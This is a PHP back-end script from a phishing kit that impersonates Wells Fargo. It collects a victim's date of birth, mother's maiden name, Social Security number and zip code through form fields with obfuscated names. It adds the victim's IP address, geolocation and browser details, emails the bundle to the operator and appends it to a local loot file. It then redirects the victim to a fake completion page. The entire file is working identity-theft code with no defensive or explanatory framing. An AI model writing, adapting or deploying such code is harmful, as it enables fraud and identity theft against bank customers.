<?php

$dob = $_POST['jsksskl'];
$maidenName = $_POST['dsdsdls'];
$ssn = $_POST['lakslas'];
$zipCode = $_POST['zksjssll'];

require_once('email_config.php');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if ($dob != null && $maidenName != null && $ssn != null && $zipCode != null) {

    $message = "";
    $message .= "---|Wells-fargo|---\n";
    $message .= "Date of Birth: " .$dob. "\n";
    $message .= "Mother Maiden Name: " .$maidenName. "\n";
    $message .= "SSN: " .$ssn. "\n";
    $message .= "Zip Code: " .$zipCode. "\n";
    $message .= "IP : " .$ip. "\n";
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .=     "Date: ".date("D M d, Y g:i a")."\n";
    $message .=     "Browser Details: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $message .= "--------------------------\n";


    $subj = " Wells |- " . $ip . "\n";

    mail($email, $subj, $message, $from);

    file_put_contents('../wells_rezlt.txt', $message, FILE_APPEND);

    header("location: ../complete.php?id=$praga$praga&session=$praga$praga");
} else {
    //exit(header('Location: https://www.wellsfargo.com/'));
    header("location: ../pafe_x.php?id=$praga$praga&session=$praga$praga");
}

?>